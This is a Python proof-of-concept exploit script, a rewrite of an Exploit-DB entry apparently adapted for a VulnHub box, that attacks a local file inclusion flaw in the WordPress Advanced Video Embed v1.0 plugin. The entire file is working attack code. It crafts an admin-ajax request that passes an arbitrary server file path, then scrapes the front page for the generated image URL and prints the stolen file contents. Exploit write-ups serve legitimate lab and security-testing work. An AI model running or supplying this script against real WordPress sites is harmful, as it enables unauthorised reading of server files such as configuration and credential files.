#!/usr/bin/env python3


######################################################################
#
#   WordPress Advanced Video Embed v1.0 plugin LFI PoC
#
#   By ori0n [c0dedead.io]
#
#   Original exploit: https://www.exploit-db.com/exploits/39646
#
#   This is a rewrite of an original exploit by evait security GmbH.
#   I have updated the script to Python 3 and added arguments in
#   order to avoid hard-coding the target URL and LFI path. I've
#   modified the exploit to pull down the "image" URL from the
#   front page of the blog instead of the post itself. This was
#   done to get the exploit working properly on a certain VulnHub
#   box.
#
######################################################################

import argparse
import random
import re
import ssl
import sys

from urllib import request
from urllib.error import *


def parse_args():
    parser = argparse.ArgumentParser(
        description="WordPress Advanced Video Embed v1.0 LFI PoC rewrite by ori0n [c0dedead.io]"
    )
    parser.add_argument("wp_root", type=str, help="URL of WordPress root")
    parser.add_argument("lfi_path", type=str, help="Path to file")
    parser.add_argument(
        "--ignore-ssl-certs",
        "-k",
        dest="ignore_ssl_cert",
        help="Ignore SSL certificates",
        default=False,
        action="store_true",
        required=False,
    )
    return parser.parse_args()


def main():
    args = parse_args()

    base_url = args.wp_root
    file_path = args.lfi_path

    id = int(random.random() * 10000000000)

    devious_url = "".join(
        [
            base_url,
            "/wp-admin/admin-ajax.php?action=ave_publishPost&title=",
            str(id),
            "&short=Hi+there&term=rnd&thumb=",
            file_path,
        ]
    )

    ctx = ssl.create_default_context()
    if args.ignore_ssl_cert:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    try:
        resp = request.urlopen(devious_url, context=ctx)
        content = resp.read().decode()
        errors = re.findall("failed to open stream: (.*) in <b>", content)
        if len(errors) > 0:
            print(f"[!] ERROR: Unable to access file '{args.lfi_path}': {errors[0]}")
            sys.exit(-1)
    except HTTPError as e:
        print("[!] ERROR: URL not found. Typo?")
    except URLError as e:
        print(
            "[!] ERROR: Unable to verify SSL certificate. Try re-running with flag '-k'"
        )
    else:
        content = request.urlopen(base_url, context=ctx).read().decode().split("\n")
        for line in content:
            if "attachment-post-thumb" not in line:
                continue
            matches = re.findall(
                'src="http[s]?://.*/wp-content/uploads/\d+\.jpeg', line
            )
            if len(matches) > 0:
                img_url = matches[0].replace('src="', "")
                break

        content = request.urlopen(img_url, context=ctx).read().decode()
        print(content, end="")


if __name__ == "__main__":
    main()
